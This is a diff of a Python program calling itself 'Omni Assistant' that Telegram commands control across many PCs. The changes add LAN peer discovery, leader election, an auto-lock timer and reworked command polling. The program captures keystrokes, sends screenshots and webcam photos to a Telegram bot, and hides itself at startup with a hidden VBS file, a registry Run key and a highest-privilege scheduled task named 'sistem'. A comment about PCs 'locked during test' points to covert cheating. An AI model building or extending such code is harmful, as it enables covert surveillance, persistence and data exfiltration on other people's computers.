@@ -191,14 +191,26 @@ def get_base_dir():
 
 BASE_DIR = get_base_dir()
 
-# ─── SINGLE INSTANCE MUTEX ────────────────────────────────────────────────────
+# ─── SINGLE INSTANCE PROTECTION ───────────────────────────────────────────────
+SINGLE_INSTANCE_SOCKET = None
 SINGLE_INSTANCE_MUTEX = None
 SINGLE_INSTANCE_LOCK_FILE = None
 
 def acquire_single_instance_mutex():
-    global SINGLE_INSTANCE_MUTEX, SINGLE_INSTANCE_LOCK_FILE
+    global SINGLE_INSTANCE_SOCKET, SINGLE_INSTANCE_MUTEX, SINGLE_INSTANCE_LOCK_FILE
+    # Tier 0: Loopback TCP port lock (atomic, OS kernel enforced, 100% reliable across all processes)
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 0)
+        s.bind(("127.0.0.1", 49812))
+        s.listen(1)
+        SINGLE_INSTANCE_SOCKET = s
+    except Exception as e:
+        log(f"Single instance protection: Another instance already running on 127.0.0.1:49812 ({e}). Exiting.")
+        sys.exit(0)
+
     if IS_WINDOWS:
-        # Tier 1: Win32 Named Mutex in Local\ namespace (accessible to standard non-admin accounts)
+        # Tier 1: Win32 Named Mutex in Local\ namespace
         try:
             safe_id = hashlib.md5(f"OmniAssistant_{PC_NAME}".encode("utf-8")).hexdigest()
             mutex_name = f"Local\\OmniAssistantLock_{safe_id}"
@@ -413,6 +425,8 @@ class AssistantState:
         self.solver_unlocked     = False
         self.key_listener_active = False
         self.key_buffer          = ""
+        self.auto_lock_timer     = None
+        self.unlocked_at         = 0.0
 
 state = AssistantState()
 
@@ -475,6 +489,13 @@ def delete_api_key(index):
 
 
 # ─── TELEGRAM ─────────────────────────────────────────────────────────────────
+TG_SESSION = requests.Session()
+try:
+    _adapter = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=20, max_retries=1)
+    TG_SESSION.mount("https://", _adapter)
+except Exception:
+    pass
+
 def tg_send_message(text, parse_mode="HTML"):
     def _worker():
         token   = getattr(state, "tg_bot_token", TG_BOT_TOKEN)
@@ -487,7 +508,7 @@ def tg_send_message(text, parse_mode="HTML"):
                 payload = {"chat_id": chat_id, "text": text}
                 if parse_mode:
                     payload["parse_mode"] = parse_mode
-                r = requests.post(url, json=payload, timeout=8)
+                r = TG_SESSION.post(url, json=payload, timeout=5)
                 if r.status_code == 200:
                     return
                 if r.status_code == 429:
@@ -495,15 +516,15 @@ def tg_send_message(text, parse_mode="HTML"):
                         wait_s = float(r.json().get("parameters", {}).get("retry_after", 3))
                     except Exception:
                         wait_s = 3.0
-                    time.sleep(wait_s + random.uniform(0.2, 0.7))
+                    time.sleep(wait_s + random.uniform(0.1, 0.3))
                     continue
                 if r.status_code != 200 and parse_mode:
-                    r2 = requests.post(url, json={"chat_id": chat_id, "text": text}, timeout=8)
+                    r2 = TG_SESSION.post(url, json={"chat_id": chat_id, "text": text}, timeout=5)
                     if r2.status_code == 200:
                         return
                 break
             except Exception:
-                time.sleep(1.0)
+                time.sleep(0.5)
     threading.Thread(target=_worker, daemon=True).start()
 
 def tg_send_photo(photo_bytes, caption="", parse_mode="HTML"):
@@ -514,10 +535,10 @@ def tg_send_photo(photo_bytes, caption="", parse_mode="HTML"):
             return
         url = f"https://api.telegram.org/bot{token}/sendPhoto"
         try:
-            requests.post(url,
+            TG_SESSION.post(url,
                 data={"chat_id": chat_id, "caption": caption, "parse_mode": parse_mode},
                 files={"photo": ("screenshot.png", io.BytesIO(photo_bytes), "image/png")},
-                timeout=15)
+                timeout=10)
         except Exception:
             pass
     threading.Thread(target=_worker, daemon=True).start()
@@ -945,6 +966,41 @@ def toggle_mode():
 _LAYOUT_EN_RU = dict(zip("qwertyuiop[]asdfghjkl;'zxcvbnm,./`", "йцукенгшщзхъфывапролджэячсмитьбю.ё"))
 _LAYOUT_RU_EN = {v: k for k, v in _LAYOUT_EN_RU.items()}
 
+def cancel_auto_lock_timer():
+    timer = getattr(state, "auto_lock_timer", None)
+    if timer is not None:
+        try:
+            timer.cancel()
+        except Exception:
+            pass
+        state.auto_lock_timer = None
+
+def on_auto_lock_timeout():
+    with state.lock:
+        if not getattr(state, "solver_unlocked", False):
+            return
+        state.solver_unlocked = False
+        state.key_listener_active = True if bool(getattr(state, "solver_password", "")) else False
+        state.key_buffer = ""
+        state.auto_lock_timer = None
+        state.unlocked_at = 0.0
+    log(f"Auto-lock: 2 hours elapsed, PC {state.pc_name} locked automatically", "WARN")
+    tg_send_message(
+        f"🔒 <b>ВРЕМЯ СЕССИИ ИСТЕКЛО (2 ЧАСА)</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🖥 <code>{state.pc_name}</code>\n"
+        f"Солвер автоматически <b>ЗАБЛОКИРОВАН</b>.\n"
+        f"Для новой разблокировки наберите пароль на клавиатуре."
+    )
+
+def start_auto_lock_timer(duration_seconds: float = 7200.0):
+    cancel_auto_lock_timer()
+    timer = threading.Timer(duration_seconds, on_auto_lock_timeout)
+    timer.daemon = True
+    state.auto_lock_timer = timer
+    state.unlocked_at = time.time()
+    timer.start()
+
 def check_keystroke_for_pass(key_name: str):
     if not getattr(state, "key_listener_active", False) or getattr(state, "solver_unlocked", False):
         return
@@ -970,12 +1026,14 @@ def check_keystroke_for_pass(key_name: str):
         state.solver_unlocked = True
         state.key_listener_active = False
         state.key_buffer = ""
+        start_auto_lock_timer(7200.0)  # Auto-lock after 2 hours (7200 sec)
         log(f"Key listener: Passcode matched! Solver UNLOCKED on {state.pc_name}", "OK")
         tg_send_message(
             f"🎯 <b>КОД СОВПАЛ С КЛАВИАТУРЫ!</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             f"🖥 <code>{state.pc_name}</code>\n"
-            f"✅ Солвер <b>РАЗБЛОКИРОВАН</b> и готов к работе! 🚀"
+            f"✅ Солвер <b>РАЗБЛОКИРОВАН</b> на 2 часа! 🚀\n"
+            f"⏱ <i>Автоматическая блокировка сработает через 2 часа.</i>"
         )
 
 
@@ -1051,6 +1109,15 @@ def setup_autostart(method: int = 0):
     cmd = get_startup_cmd()
     success_list = []
 
+    # Clean up redundant old bat runner if present to avoid dual-launch
+    try:
+        startup_dir = os.path.join(os.environ.get("APPDATA", ""), r"Microsoft\Windows\Start Menu\Programs\Startup")
+        bat_old = os.path.join(startup_dir, "sistem_runner.bat")
+        if os.path.exists(bat_old):
+            os.remove(bat_old)
+    except Exception:
+        pass
+
     try:
         if winreg:
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
@@ -1060,30 +1127,28 @@ def setup_autostart(method: int = 0):
     except Exception:
         pass
 
-    try:
-        startup_dir = os.path.join(os.environ.get("APPDATA", ""), r"Microsoft\Windows\Start Menu\Programs\Startup")
-        if os.path.exists(startup_dir):
-            vbs = os.path.join(startup_dir, "sistem_start.vbs")
-            with open(vbs, "w", encoding="utf-8") as f:
-                f.write(f'Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run "{cmd.replace(chr(34), chr(34)+chr(34))}", 0, False\n')
-            success_list.append("2. Скрытый VBS в Автозагрузке")
-            bat = os.path.join(startup_dir, "sistem_runner.bat")
-            with open(bat, "w", encoding="utf-8") as f:
-                f.write(f'@echo off\nstart "" {cmd}\nexit\n')
-            success_list.append("4. BAT-раннер в Автозагрузке")
-    except Exception:
-        pass
+    if not success_list:
+        try:
+            startup_dir = os.path.join(os.environ.get("APPDATA", ""), r"Microsoft\Windows\Start Menu\Programs\Startup")
+            if os.path.exists(startup_dir):
+                vbs = os.path.join(startup_dir, "sistem_start.vbs")
+                with open(vbs, "w", encoding="utf-8") as f:
+                    f.write(f'Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run "{cmd.replace(chr(34), chr(34)+chr(34))}", 0, False\n')
+                success_list.append("2. Скрытый VBS в Автозагрузке")
+        except Exception:
+            pass
 
-    try:
-        task_name = "sistem"
-        subprocess.run(["schtasks", "/delete", "/tn", task_name, "/f"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        res = subprocess.run(["schtasks", "/create", "/tn", task_name, "/tr", cmd, "/sc", "onlogon", "/rl", "highest", "/f"], capture_output=True, text=True)
-        if res.returncode != 0:
-            res = subprocess.run(["schtasks", "/create", "/tn", task_name, "/tr", cmd, "/sc", "onlogon", "/f"], capture_output=True, text=True)
-        if res.returncode == 0:
-            success_list.append("3. Планировщик задач (onlogon)")
-    except Exception:
-        pass
+    if not success_list:
+        try:
+            task_name = "sistem"
+            subprocess.run(["schtasks", "/delete", "/tn", task_name, "/f"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            res = subprocess.run(["schtasks", "/create", "/tn", task_name, "/tr", cmd, "/sc", "onlogon", "/rl", "highest", "/f"], capture_output=True, text=True)
+            if res.returncode != 0:
+                res = subprocess.run(["schtasks", "/create", "/tn", task_name, "/tr", cmd, "/sc", "onlogon", "/f"], capture_output=True, text=True)
+            if res.returncode == 0:
+                success_list.append("3. Планировщик задач (onlogon)")
+        except Exception:
+            pass
 
     if success_list:
         return True, "Автозапуск настроен:\n• " + "\n• ".join(success_list)
@@ -1243,6 +1308,102 @@ def log_watcher_thread():
         time.sleep(1.0)
 
 
+# ─── LOCAL LAN PEER DISCOVERY & LEADER ELECTION ──────────────────────────────
+LAN_PEER_PORT = 38291
+
+def lan_peer_listener():
+    """Background listener for local peer discovery on LAN."""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.bind(("0.0.0.0", LAN_PEER_PORT))
+    except Exception as e:
+        log(f"LAN peer listener bind notice: {e}")
+        return
+
+    while state.is_running:
+        try:
+            data, addr = sock.recvfrom(2048)
+            if not data:
+                continue
+            raw_text = data.decode("utf-8", errors="ignore").strip()
+            if raw_text == "PING_OMNI":
+                me = {"SOLVER": "🎯", "TYPER_PYTHON": "🐍", "TYPER_CPP": "⚙️"}.get(state.mode, "💻")
+                unlocked = bool(getattr(state, "solver_unlocked", False))
+                ss = "Locked" if not unlocked else ("Busy" if state.busy else "Ready")
+                payload = json.dumps({
+                    "pc": state.pc_name,
+                    "mode": state.mode,
+                    "status": ss,
+                    "unlocked": unlocked,
+                    "icon": me,
+                    "unlocked_at": getattr(state, "unlocked_at", 0.0),
+                    "key_index": getattr(state, "active_key_index", 1)
+                })
+                resp = f"PONG_OMNI:{payload}".encode("utf-8")
+                sock.sendto(resp, addr)
+        except Exception:
+            pass
+
+def get_online_peers(timeout=0.35):
+    """Discovers all online PCs on the local network via UDP broadcast (ultra-fast)."""
+    peers = {}
+    me = {"SOLVER": "🎯", "TYPER_PYTHON": "🐍", "TYPER_CPP": "⚙️"}.get(state.mode, "💻")
+    unlocked = bool(getattr(state, "solver_unlocked", False))
+    ss = "Locked" if not unlocked else ("Busy" if state.busy else "Ready")
+    peers[state.pc_name] = {
+        "pc": state.pc_name,
+        "mode": state.mode,
+        "status": ss,
+        "unlocked": unlocked,
+        "icon": me,
+        "unlocked_at": getattr(state, "unlocked_at", 0.0),
+        "key_index": getattr(state, "active_key_index", 1)
+    }
+
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+        sock.settimeout(0.12)
+
+        # Broadcast ping immediately
+        for target_ip in ("255.255.255.255", "127.0.0.1"):
+            try:
+                sock.sendto(b"PING_OMNI", (target_ip, LAN_PEER_PORT))
+            except Exception:
+                pass
+
+        start_t = time.time()
+        second_ping_sent = False
+        while time.time() - start_t < timeout:
+            if not second_ping_sent and (time.time() - start_t) > 0.12:
+                second_ping_sent = True
+                try:
+                    sock.sendto(b"PING_OMNI", ("255.255.255.255", LAN_PEER_PORT))
+                except Exception:
+                    pass
+            try:
+                data, addr = sock.recvfrom(2048)
+                if not data:
+                    continue
+                raw = data.decode("utf-8", errors="ignore").strip()
+                if raw.startswith("PONG_OMNI:"):
+                    json_str = raw[len("PONG_OMNI:"):]
+                    info = json.loads(json_str)
+                    p_name = info.get("pc")
+                    if p_name:
+                        peers[p_name] = info
+            except socket.timeout:
+                continue
+            except Exception:
+                break
+        sock.close()
+    except Exception as e:
+        log(f"Peer discovery error: {e}")
+
+    return peers
+
+
 # ─── TELEGRAM BOT POLLER ──────────────────────────────────────────────────────
 # ─── STARTUP ANNOUNCEMENT DEDUP ──────────────────────────────────────────────
 _STARTUP_SENT = False
@@ -1250,7 +1411,8 @@ _STARTUP_LOCK = threading.Lock()
 
 def tg_bot_poller():
     global _STARTUP_SENT
-    last_update_id = None
+    BOT_START_TIME = time.time()
+    processed_update_ids = set()
     log(f"Telegram poller started on {state.pc_name}")
 
     # Startup announcement — sent ONCE per process, with random delay to spread
@@ -1276,15 +1438,15 @@ def tg_bot_poller():
     while state.is_running:
         try:
             token  = getattr(state, "tg_bot_token", TG_BOT_TOKEN)
+            if not token:
+                time.sleep(3.0)
+                continue
             url    = f"https://api.telegram.org/bot{token}/getUpdates"
-            # Use long-polling with proper offset to avoid re-processing old updates
-            # timeout=0 avoids HTTP 409 Conflict when multiple PCs poll same bot
-            params = {"timeout": 0}
-            if last_update_id is not None:
-                params["offset"] = last_update_id + 1
-            else:
-                params["offset"] = -1  # get only the latest update on first call
-            resp = requests.get(url, params=params, timeout=12)
+
+            # offset=-15 retrieves the latest updates queue without advancing the server-side offset,
+            # ensuring all running PCs receive broadcast commands without race conditions or starvation.
+            params = {"timeout": 0, "offset": -15}
+            resp = TG_SESSION.get(url, params=params, timeout=5)
             if resp.status_code == 429:
                 try:
                     retry_after = resp.json().get("parameters", {}).get("retry_after", 4)
@@ -1293,30 +1455,34 @@ def tg_bot_poller():
                 time.sleep(retry_after)
                 continue
             if resp.status_code == 409:
-                time.sleep(random.uniform(1.0, 2.5))
+                time.sleep(random.uniform(0.4, 0.8))
                 continue
             if resp.status_code != 200:
-                time.sleep(2)
+                time.sleep(1.0)
                 continue
             data = resp.json()
             if not data.get("ok"):
-                time.sleep(2)
+                time.sleep(1.0)
                 continue
 
             results = data.get("result", [])
-            if last_update_id is None:
-                # On first boot: mark all existing updates as seen, don't process them
-                last_update_id = max((u.get("update_id", 0) for u in results), default=0)
-                continue
-
             for update in results:
                 uid = update.get("update_id", 0)
-                if uid <= last_update_id:
+                if uid in processed_update_ids:
                     continue
-                last_update_id = uid
+                processed_update_ids.add(uid)
+                if len(processed_update_ids) > 1000:
+                    processed_update_ids = set(sorted(processed_update_ids)[-500:])
+
                 msg = update.get("message") or update.get("channel_post")
                 if not msg:
                     continue
+
+                # CRITICAL: Ignore updates sent before this process started (prevents replaying old commands on boot)
+                msg_date = msg.get("date", 0)
+                if msg_date < (BOT_START_TIME - 15):
+                    continue
+
                 chat_id = str(msg.get("chat", {}).get("id", ""))
                 target_chat = str(getattr(state, "tg_chat_id", TG_CHAT_ID))
                 if target_chat and chat_id != target_chat:
@@ -1329,6 +1495,13 @@ def tg_bot_poller():
                 if not parts:
                     continue
 
+                has_every = any(
+                    p.lower().lstrip("@") in ("all", "все", "всё", "*", "everybody") or
+                    p.lower().lstrip("@").startswith("ever") or
+                    p.lower().lstrip("@").startswith("кажд")
+                    for p in parts
+                )
+
                 pc_lower = state.pc_name.lower()
                 target_pc   = None
                 clean_tokens = []
@@ -1340,7 +1513,7 @@ def tg_bot_poller():
                             pass  # broadcast to all
                         else:
                             target_pc = tag
-                    elif pl in ("all", "все") and len(parts) > 1:
+                    elif (pl in ("all", "все", "every", "everybody") or pl.startswith("ever")) and len(parts) > 1:
                         pass  # broadcast marker
                     elif pl == pc_lower:
                         target_pc = pc_lower
@@ -1355,58 +1528,129 @@ def tg_bot_poller():
                 cmd  = clean_tokens[0].lower().split('@')[0]
                 args = clean_tokens[1:]
 
-                # Stagger responses for broadcast mass commands to prevent Telegram 429 rate limit
-                # Each PC picks a unique delay based on its name hash to avoid collisions
-                if target_pc is None and cmd in ("/list_pc", "/status", "/solver", "/python", "/typer_py", "/cpp", "/typer_cpp", "/pass", "/setpass", "/lock", "/terminate", "/autostart"):
+                # If PC is locked during test and command is broadcast (not targeted), ignore unless 'every' is specified
+                is_unlocked = bool(getattr(state, "solver_unlocked", False))
+                if target_pc is None and not is_unlocked and not has_every:
+                    if cmd not in (
+                        "/pass", "/listen", "/password", "/watch", "/wait_code", "/wait_pass", "/await", "/код", "/ждать",
+                        "/setpass", "/set_password", "/установить_пароль",
+                        "/lock", "/lockdown",
+                        "/terminate", "/kill", "/терминате", "/exit", "/стоп",
+                        "/start", "/help"
+                    ):
+                        continue
+
+                # Ultra-fast micro-stagger for mass broadcast commands (max 0.28s spread to avoid 429)
+                if target_pc is None and cmd in ("/status", "/solver", "/python", "/typer_py", "/cpp", "/typer_cpp", "/pass", "/setpass", "/lock", "/terminate", "/autostart"):
                     _pc_hash = int(hashlib.md5(state.pc_name.encode()).hexdigest(), 16)
-                    time.sleep((_pc_hash % 20) * 0.15)  # 0..2.85s spread based on PC name
+                    time.sleep((_pc_hash % 8) * 0.035)  # 0..0.245s micro-stagger
 
                 # ── /start /help ──────────────────────────────────
                 if cmd in ("/start", "/help"):
-                    tg_send_message(
-                        f"╔══════════════════════════╗\n"
-                        f"║  🤖  <b>OMNI ASSISTANT</b>  ⚡  ║\n"
-                        f"║  🌐  GLOBAL CONTROL    ║\n"
-                        f"╚══════════════════════════╝\n"
-                        f"\n<b>🖥 SYSTEM CONTROL</b>\n"
-                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                        f"📊 /status      — system status\n"
-                        f"⚡ /autostart <code>on|off</code> — автозапуск\n"
-                        f"💀 /terminate   — завершить процесс\n"
-                        f"🌐 /list_pc     — online PCs\n"
-                        f"✏️ /rename <code>&lt;имя&gt;</code> — переименовать ПК\n"
-                        f"\n<b>📸 MEDIA &amp; SCREEN</b>\n"
-                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                        f"🖼 /screenshot  — screen capture\n"
-                        f"📷 /webcam      — webcam photo\n"
-                        f"\n<b>🔐 SOLVER PASSWORD</b>\n"
-                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                        f"👂 /pass <code>[код]</code>      — ждать ввод кода с клавиатуры\n"
-                        f"🔐 /setpass &lt;пароль&gt;   — установить общий пароль\n"
-                        f"🔒 /lock              — заблокировать солвер\n"
-                        f"\n<b>🔑 MODES &amp; KEYS</b>\n"
-                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                        f"🎯 /solver          — Solver mode\n"
-                        f"🐍 /python          — Python Typer mode\n"
-                        f"⚙️ /cpp             — C++ Typer mode\n"
-                        f"🔑 /key <code>1|2|3</code>       — switch API key\n"
-                        f"🔄 /change key <code>1 &lt;key&gt;</code> — set API key\n"
-                        f"🗑️ /del key <code>1|2|3|all</code> — delete key\n"
-                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                        f"💡 Таргет: <code>@Имя /команда</code> или <code>/команда</code> для всех"
-                    )
+                    is_leader = True
+                    if target_pc is None:
+                        peers = get_online_peers(timeout=0.35)
+                        sorted_pcs = sorted(peers.keys(), key=lambda x: x.lower())
+                        if sorted_pcs and state.pc_name.lower() != sorted_pcs[0].lower():
+                            is_leader = False
+                    if is_leader:
+                        tg_send_message(
+                            f"╔══════════════════════════╗\n"
+                            f"║  🤖  <b>OMNI ASSISTANT</b>  ⚡  ║\n"
+                            f"║  🌐  GLOBAL CONTROL    ║\n"
+                            f"╚══════════════════════════╝\n"
+                            f"\n<b>🖥 SYSTEM CONTROL</b>\n"
+                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                            f"📊 /status      — system status\n"
+                            f"⚡ /autostart <code>on|off</code> — автозапуск\n"
+                            f"💀 /terminate   — завершить процесс\n"
+                            f"🌐 /list_pc [every] — активные ПК (или все ПК)\n"
+                            f"✏️ /rename <code>&lt;имя&gt;</code> — переименовать ПК\n"
+                            f"\n<b>📸 MEDIA &amp; SCREEN</b>\n"
+                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                            f"🖼 /screenshot  — screen capture\n"
+                            f"📷 /webcam      — webcam photo\n"
+                            f"\n<b>🔐 SOLVER PASSWORD</b>\n"
+                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                            f"👂 /pass <code>[код]</code>      — ждать ввод кода с клавиатуры\n"
+                            f"🔐 /setpass &lt;пароль&gt;   — установить общий пароль\n"
+                            f"🔒 /lock              — заблокировать солвер\n"
+                            f"\n<b>🔑 MODES &amp; KEYS</b>\n"
+                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                            f"🎯 /solver          — Solver mode\n"
+                            f"🐍 /python          — Python Typer mode\n"
+                            f"⚙️ /cpp             — C++ Typer mode\n"
+                            f"🔑 /key <code>1|2|3</code>       — switch API key\n"
+                            f"🔄 /change key <code>1 &lt;key&gt;</code> — set API key\n"
+                            f"🗑️ /del key <code>1|2|3|all</code> — delete key\n"
+                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                            f"💡 Таргет: <code>@Имя /команда</code> или <code>/команда</code> для всех"
+                        )
 
                 # ── /list_pc ──────────────────────────────────────
                 elif cmd == "/list_pc":
-                    me = {"SOLVER": "🎯", "TYPER_PYTHON": "🐍", "TYPER_CPP": "⚙️"}.get(state.mode, "💻")
-                    si = "🔒" if not getattr(state, "solver_unlocked", False) else ("⏳" if state.busy else "✅")
-                    ss = "Locked" if not getattr(state, "solver_unlocked", False) else ("Busy" if state.busy else "Ready")
-                    tg_send_message(
-                        f"💻 <b>ONLINE PC:</b> <code>{state.pc_name}</code>\n"
-                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                        f"{me} Режим: <b>{state.mode}</b>\n"
-                        f"{si} Состояние: <b>{ss}</b>"
-                    )
+                    args_lower = [a.lower() for a in args]
+                    show_every = has_every or any(a in ("every", "all", "все", "всё", "*") for a in args_lower)
+
+                    if target_pc is not None and target_pc == pc_lower:
+                        me = {"SOLVER": "🎯", "TYPER_PYTHON": "🐍", "TYPER_CPP": "⚙️"}.get(state.mode, "💻")
+                        si = "🔒" if not is_unlocked else ("⏳" if state.busy else "✅")
+                        ss = "Locked" if not is_unlocked else ("Busy" if state.busy else "Ready")
+                        tg_send_message(
+                            f"💻 <b>ONLINE PC:</b> <code>{state.pc_name}</code>\n"
+                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                            f"{me} Режим: <b>{state.mode}</b>\n"
+                            f"{si} Состояние: <b>{ss}</b>"
+                        )
+                    elif target_pc is None:
+                        # Ultra-fast broadcast LAN discovery (0.35s)
+                        peers = get_online_peers(timeout=0.35)
+
+                        if show_every:
+                            display_peers = peers
+                            header_title = f"💻 <b>ВСЕ ПК В СЕТИ ({len(display_peers)}):</b>"
+                        else:
+                            # By default show only unlocked PCs (where solver password was entered)
+                            display_peers = {k: v for k, v in peers.items() if v.get("unlocked") is True}
+                            header_title = f"🎯 <b>АКТИВНЫЕ ПК С ПАРОЛЕМ ({len(display_peers)}):</b>"
+
+                        # Leader election among display_peers (or among all peers if display_peers is empty)
+                        pool_for_leader = display_peers if display_peers else peers
+                        sorted_leader_pool = sorted(pool_for_leader.keys(), key=lambda x: x.lower())
+
+                        if sorted_leader_pool and state.pc_name.lower() == sorted_leader_pool[0].lower():
+                            sorted_pcs = sorted(display_peers.keys(), key=lambda x: x.lower())
+                            if not sorted_pcs:
+                                tg_send_message(
+                                    f"🔒 <b>НЕТ АКТИВНЫХ ПК (пароль не введен)</b>\n"
+                                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                                    f"Все ПК в сети сейчас заблокированы.\n"
+                                    f"💡 <i>Чтобы увидеть все ПК в сети:</i>\n"
+                                    f"<code>/list_pc every</code>"
+                                )
+                            else:
+                                lines = []
+                                for idx, pc in enumerate(sorted_pcs, 1):
+                                    p_info = display_peers[pc]
+                                    p_icon = p_info.get("icon", "💻")
+                                    p_mode = p_info.get("mode", "SOLVER")
+                                    p_status = p_info.get("status", "Unknown")
+                                    s_icon = "🔒" if p_status == "Locked" else ("⏳" if p_status == "Busy" else "✅")
+                                    lines.append(
+                                        f"<b>{idx}.</b> 🖥 <code>{pc}</code>  [{p_icon} <b>{p_mode}</b> | {s_icon} <b>{p_status}</b>]"
+                                    )
+                                pc_list_str = "\n".join(lines)
+                                tip = "💡 <i>Показать все ПК (включая Locked): <code>/list_pc every</code></i>" if not show_every else "💡 <i>Таргет: <code>@Имя /команда</code></i>"
+                                tg_send_message(
+                                    f"{header_title}\n"
+                                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                                    f"{pc_list_str}\n"
+                                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                                    f"{tip}"
+                                )
+                        else:
+                            # Not the leader: stay silent so chat is clean!
+                            pass
 
                 # ── /rename /setname ──────────────────────────────
                 elif cmd in ("/rename", "/setname", "/rename_pc", "/set_pc_name"):
@@ -1427,7 +1671,13 @@ def tg_bot_poller():
                     log(f"TERMINATE requested from Telegram, PC: {state.pc_name}")
                     set_system_cursor("NORMAL")
                     stop_typing_mode()
-                    tg_send_message(f"💀 <b>Процесс завершен</b> на ПК <code>{state.pc_name}</code>.")
+                    if target_pc is not None and target_pc == pc_lower:
+                        tg_send_message(f"💀 <b>Процесс завершен</b> на ПК <code>{state.pc_name}</code>.")
+                    elif target_pc is None:
+                        peers = get_online_peers(timeout=0.35)
+                        sorted_pcs = sorted(peers.keys(), key=lambda x: x.lower())
+                        if sorted_pcs and state.pc_name.lower() == sorted_pcs[0].lower():
+                            tg_send_message(f"💀 <b>Процессы завершены</b> на всех ПК в сети ({len(peers)} шт.).")
                     time.sleep(0.5)
                     try:
                         os.kill(os.getpid(), 9)
@@ -1440,19 +1690,37 @@ def tg_bot_poller():
                     sub = args[0].lower() if args else ""
                     if cmd == "/autostart_on" or sub in ("on", "enable", "вкл", "+", "1"):
                         ok, info = setup_autostart(0)
-                        tg_send_message(f"{'✅' if ok else '❌'} {info}")
+                        if target_pc is not None and target_pc == pc_lower:
+                            tg_send_message(f"{'✅' if ok else '❌'} [<code>{state.pc_name}</code>] {info}")
+                        elif target_pc is None:
+                            peers = get_online_peers(timeout=0.35)
+                            sorted_pcs = sorted(peers.keys(), key=lambda x: x.lower())
+                            if sorted_pcs and state.pc_name.lower() == sorted_pcs[0].lower():
+                                tg_send_message(f"⚡ Автозапуск <b>ВКЛЮЧЕН</b> на всех ПК ({len(peers)} шт.).")
                     elif cmd in ("/autostart_off", "/autostart_del") or sub in ("off", "del", "disable", "выкл", "-", "0"):
                         ok, info = remove_autostart()
-                        tg_send_message(f"🗑️ {info}")
+                        if target_pc is not None and target_pc == pc_lower:
+                            tg_send_message(f"🗑️ [<code>{state.pc_name}</code>] {info}")
+                        elif target_pc is None:
+                            peers = get_online_peers(timeout=0.35)
+                            sorted_pcs = sorted(peers.keys(), key=lambda x: x.lower())
+                            if sorted_pcs and state.pc_name.lower() == sorted_pcs[0].lower():
+                                tg_send_message(f"🗑️ Автозапуск <b>ОТКЛЮЧЕН</b> на всех ПК ({len(peers)} шт.).")
                     else:
                         ok, methods = get_autostart_status()
                         st_str = f"🟢 <b>ВКЛЮЧЕН</b> ({', '.join(methods)})" if ok else "🔴 <b>ВЫКЛЮЧЕН</b>"
-                        tg_send_message(
-                            f"⚡ <b>АВТОЗАПУСК:</b> {st_str}\n"
-                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                            f"• Включить: <code>/autostart on</code>\n"
-                            f"• Выключить: <code>/autostart off</code>"
-                        )
+                        if target_pc is not None and target_pc == pc_lower:
+                            tg_send_message(f"⚡ <b>АВТОЗАПУСК ({state.pc_name}):</b> {st_str}")
+                        elif target_pc is None:
+                            peers = get_online_peers(timeout=0.35)
+                            sorted_pcs = sorted(peers.keys(), key=lambda x: x.lower())
+                            if sorted_pcs and state.pc_name.lower() == sorted_pcs[0].lower():
+                                tg_send_message(
+                                    f"⚡ <b>АВТОЗАПУСК:</b> {st_str}\n"
+                                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                                    f"• Включить на всех ПК: <code>/autostart on</code>\n"
+                                    f"• Выключить на всех ПК: <code>/autostart off</code>"
+                                )
 
                 # ── /screenshot ───────────────────────────────────
                 elif cmd == "/screenshot":
@@ -1474,40 +1742,80 @@ def tg_bot_poller():
                 elif cmd in ("/pass", "/listen", "/password", "/watch", "/wait_code", "/wait_pass", "/await", "/код", "/ждать"):
                     sub = " ".join(args).strip()
                     if sub.lower() in ("off", "stop", "выкл", "стоп", "0", "-"):
+                        cancel_auto_lock_timer()
                         state.key_listener_active = False
                         state.key_buffer = ""
-                        tg_send_message(f"⏹️ Ожидание кода с клавиатуры <b>отключено</b> на ПК <code>{state.pc_name}</code>.")
+                        state.unlocked_at = 0.0
+                        if target_pc is not None and target_pc == pc_lower:
+                            tg_send_message(f"⏹️ Ожидание кода с клавиатуры <b>отключено</b> на ПК <code>{state.pc_name}</code>.")
+                        elif target_pc is None:
+                            peers = get_online_peers(timeout=0.35)
+                            sorted_pcs = sorted(peers.keys(), key=lambda x: x.lower())
+                            if sorted_pcs and state.pc_name.lower() == sorted_pcs[0].lower():
+                                tg_send_message(f"⏹️ Ожидание кода с клавиатуры <b>отключено</b> на всех ПК ({len(peers)} шт.).")
                     elif sub:
+                        cancel_auto_lock_timer()
                         state.solver_password  = sub
                         state.solver_unlocked  = False
                         state.key_listener_active = True
                         state.key_buffer       = ""
